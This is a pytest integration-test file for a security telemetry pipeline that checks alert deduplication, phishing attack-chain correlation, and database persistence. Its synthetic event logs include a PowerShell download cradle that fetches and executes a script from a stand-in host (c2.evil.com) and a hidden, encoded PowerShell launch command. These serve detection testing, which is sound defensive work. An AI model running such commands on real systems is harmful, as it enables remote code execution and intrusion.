"""Integration tests for IngestionPipeline, AlertManager, and AttackChainEngine.

Validates end-to-end telemetry ingestion with windowed alert deduplication,
multi-stage attack chain correlation, and complete SQLite persistence into
investigations, alerts, and alert_evidence tables.
"""

from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path

import pytest

from app.correlation.alert_manager import AlertManager
from app.correlation.chain_engine import AttackChainEngine
from app.database.connection import DatabaseManager
from app.database.migrations import MigrationRunner
from app.database.repository import (
    AlertRepository,
    EventRepository,
    InvestigationRepository,
)
from app.ingestion.pipeline import IngestionPipeline, IngestionResult
from app.models.incident import CompoundIncident


@pytest.fixture
def db_manager(tmp_path: Path) -> DatabaseManager:
    """Provide a fresh SQLite database migrated with the complete initial schema."""
    db_file = tmp_path / "test_correlation_integration.db"
    mgr = DatabaseManager(db_path=db_file)
    runner = MigrationRunner(mgr)
    runner.apply_migrations()
    return mgr


@pytest.fixture
def pipeline(db_manager: DatabaseManager) -> IngestionPipeline:
    """Provide an IngestionPipeline instance with database integration."""
    return IngestionPipeline(db_manager=db_manager)


def test_pipeline_initialization_defaults(pipeline: IngestionPipeline, db_manager: DatabaseManager) -> None:
    """Verify IngestionPipeline automatically initializes AlertManager and AttackChainEngine."""
    assert isinstance(pipeline.alert_manager, AlertManager)
    assert isinstance(pipeline.attack_chain_engine, AttackChainEngine)
    assert isinstance(pipeline.investigation_repo, InvestigationRepository)
    assert pipeline.db_manager is db_manager


def test_streaming_ingestion_deduplicates_repeated_alerts(
    pipeline: IngestionPipeline,
    db_manager: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Verify that multiple repetitive detection events are deduplicated into a single alert row."""
    # Create 3 repeated beaconing events within 6 minutes
    base_time = "2026-11-04T12:00:00Z"
    events_data = [
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-PowerShell"},
                "EventID": 4104,
                "TimeCreated": {"@SystemTime": f"2026-11-04T12:0{i}:00Z"},
                "EventRecordID": 1000 + i,
                "Computer": "VICTIM-PC.corp.local",
                "Channel": "Microsoft-Windows-PowerShell/Operational",
            },
            "EventData": {
                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://c2.evil.com/b.ps1')",
                "ScriptBlockId": f"{{11111111-2222-3333-4444-55555555555{i}}}",
            },
        }
        for i in range(3)
    ]

    log_file = tmp_path / "repeated_beacon.json"
    log_file.write_text(json.dumps(events_data), encoding="utf-8")

    result = pipeline.ingest_and_persist(log_file, run_analyzers=True, run_correlations=True)
    assert isinstance(result, IngestionResult)
    assert len(result.events) == 3

    # Alert deduplication verification
    # First match creates the alert; subsequent 2 matches are suppressed and increment count
    assert result.deduplicated_alerts_count == 2

    alert_repo = AlertRepository(db_manager)
    with db_manager.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT id, rule_id, event_count, status FROM alerts WHERE rule_id = 'PWSH-COMPOSITE-001';")
        rows = cur.fetchall()
        assert len(rows) == 1, "Expected exactly 1 deduplicated alert row in SQLite"
        alert_id, rule_id, event_count, status = rows[0]
        assert rule_id == "PWSH-COMPOSITE-001"
        assert event_count == 3
        assert status == "New"

        # Evidence records should link all 3 events
        cur.execute("SELECT COUNT(*) FROM alert_evidence WHERE alert_id = ?;", (alert_id,))
        evidence_count = int(cur.fetchone()[0])
        assert evidence_count == 3


def test_end_to_end_phishing_attack_chain_correlation_and_persistence(
    pipeline: IngestionPipeline,
    db_manager: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Verify end-to-end correlation of a 3-stage phishing attack sequence."""
    winword_guid = "{11111111-0000-0000-0000-000000000001}"
    pwsh_guid = "{22222222-0000-0000-0000-000000000002}"

    attack_events = [
        # Stage 1: Phishing Root Execution (WINWORD.EXE)
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 1,
                "TimeCreated": {"@SystemTime": "2026-11-04T13:00:00Z"},
                "EventRecordID": 5001,
                "Computer": "FINANCE-DESK.corp.local",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "UtcTime": "2026-11-04 13:00:00.000",
                "ProcessGuid": winword_guid,
                "ProcessId": 1200,
                "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "CommandLine": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\alice\\Downloads\\Invoice.docm"',
                "User": "CORP\\alice",
                "ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
                "ParentProcessId": 800,
                "ParentImage": "C:\\Windows\\explorer.exe",
                "ParentCommandLine": "explorer.exe",
                "ParentUser": "CORP\\alice",
            },
        },
        # Stage 2: Script Interpreter Spawn (powershell.exe under WINWORD.EXE)
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 1,
                "TimeCreated": {"@SystemTime": "2026-11-04T13:01:30Z"},
                "EventRecordID": 5002,
                "Computer": "FINANCE-DESK.corp.local",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "UtcTime": "2026-11-04 13:01:30.000",
                "ProcessGuid": pwsh_guid,
                "ProcessId": 2400,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0A...",
                "User": "CORP\\alice",
                "ParentProcessGuid": winword_guid,
                "ParentProcessId": 1200,
                "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "ParentCommandLine": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" "C:\\Users\\alice\\Downloads\\Invoice.docm"',
                "ParentUser": "CORP\\alice",
            },
        },
        # Stage 3: Outbound Network Egress (powershell.exe to public C2 IP)
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 3,
                "TimeCreated": {"@SystemTime": "2026-11-04T13:02:15Z"},
                "EventRecordID": 5003,
                "Computer": "FINANCE-DESK.corp.local",
                "Channel": "Microsoft-Windows-Sysmon/Operational",
            },
            "EventData": {
                "UtcTime": "2026-11-04 13:02:15.000",
                "ProcessGuid": pwsh_guid,
                "ProcessId": 2400,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "User": "CORP\\alice",
                "DestinationIp": "198.51.100.77",
                "DestinationPort": 443,
                "Protocol": "tcp",
            },
        },
    ]

    log_file = tmp_path / "phishing_attack.json"
    log_file.write_text(json.dumps(attack_events), encoding="utf-8")

    result = pipeline.ingest_and_persist(
        log_file,
        sync_processes=True,
        run_detections=True,
        run_analyzers=True,
        run_correlations=True,
    )

    # 1. IngestionResult exposes typed CompoundIncidents
    assert len(result.incidents) == 1
    assert result.compound_incidents == result.incidents
    incident = result.incidents[0]
    assert isinstance(incident, CompoundIncident)
    assert incident.chain_id == "CHAIN-PHISH-001"
    assert incident.severity == "Critical"
    assert len(incident.stages) == 3
    assert result.investigations_created == 1

    # 2. SQLite investigations table verification
    inv_repo = InvestigationRepository(db_manager)
    invs = inv_repo.list_investigations(priority="Critical")
    assert len(invs) == 1
    inv = invs[0]
    assert "Malicious Document" in inv["title"]
    assert inv["priority"] == "Critical"
    assert inv["status"] == "Open"
    assert "Chronological Attack Progression" in inv["summary"]

    # 3. SQLite alerts table verification
    alert_repo = AlertRepository(db_manager)
    with db_manager.get_connection() as conn:
        cur = conn.cursor()
        cur.execute("SELECT id, rule_id, severity, status, event_count FROM alerts WHERE rule_id = 'CHAIN-PHISH-001';")
        alert_row = cur.fetchone()
        assert alert_row is not None
        inc_alert_id, rule_id, severity, status, event_count = alert_row
        assert rule_id == "CHAIN-PHISH-001"
        assert severity == "Critical"
        assert status == "New"

        # 4. alert_evidence foreign key links
        cur.execute("SELECT event_id, explanation FROM alert_evidence WHERE alert_id = ?;", (inc_alert_id,))
        evidence_rows = cur.fetchall()
        assert len(evidence_rows) >= 3

    # 5. Forensic drilldown verification on the compound incident
    drilldown = pipeline.alert_manager.get_alert_forensic_drilldown(inc_alert_id)
    assert drilldown["alert_id"] == inc_alert_id
    assert drilldown["severity"] == "Critical"
    assert len(drilldown["evidence"]) >= 3
    assert len(drilldown["events"]) >= 3


def test_run_correlations_disabled_toggle(
    pipeline: IngestionPipeline,
    db_manager: DatabaseManager,
    tmp_path: Path,
) -> None:
    """Verify that setting run_correlations=False suppresses AttackChainEngine execution."""
    winword_guid = "{AAAA-1111}"
    pwsh_guid = "{BBBB-2222}"

    attack_events = [
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 1,
                "TimeCreated": {"@SystemTime": "2026-11-04T14:00:00Z"},
                "EventRecordID": 6001,
                "Computer": "HOST-TOGGLE.corp.local",
            },
            "EventData": {
                "ProcessGuid": winword_guid,
                "ProcessId": 100,
                "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                "CommandLine": "WINWORD.EXE doc.docm",
            },
        },
        {
            "System": {
                "Provider": {"@Name": "Microsoft-Windows-Sysmon"},
                "EventID": 1,
                "TimeCreated": {"@SystemTime": "2026-11-04T14:01:00Z"},
                "EventRecordID": 6002,
                "Computer": "HOST-TOGGLE.corp.local",
            },
            "EventData": {
                "ProcessGuid": pwsh_guid,
                "ProcessId": 200,
                "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "CommandLine": "powershell.exe",
                "ParentProcessGuid": winword_guid,
            },
        },
    ]

    log_file = tmp_path / "toggle_test.json"
    log_file.write_text(json.dumps(attack_events), encoding="utf-8")

    result = pipeline.ingest_and_persist(log_file, run_correlations=False)
    assert result.incidents == []
    assert result.investigations_created == 0

    inv_repo = InvestigationRepository(db_manager)
    assert len(inv_repo.list_investigations()) == 0
